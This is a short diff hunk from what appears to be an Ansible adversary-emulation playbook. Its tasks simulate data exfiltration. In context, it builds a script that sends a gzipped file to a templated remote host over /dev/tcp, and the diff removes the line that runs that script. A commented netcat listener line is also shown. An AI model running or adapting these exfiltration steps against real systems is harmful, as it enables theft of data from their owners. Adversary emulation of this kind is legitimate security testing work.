@@ -30,7 +30,6 @@
       shell: |
         echo '#!/bin/bash' > exfil.sh
         echo 'cat /tmp/{{ exfiltration_file }}.gz > /dev/tcp/{{ exfil_fqdn }}/{{ exfil_port }}' >> exfil.sh
-        bash /tmp/exfil.sh
       # netcat -lvp > {{ exfiltration_file }}-tcp.gz
       when: exfil_check.stat.exists
     - name: Exfiltration Over Alternative Protocol UDP
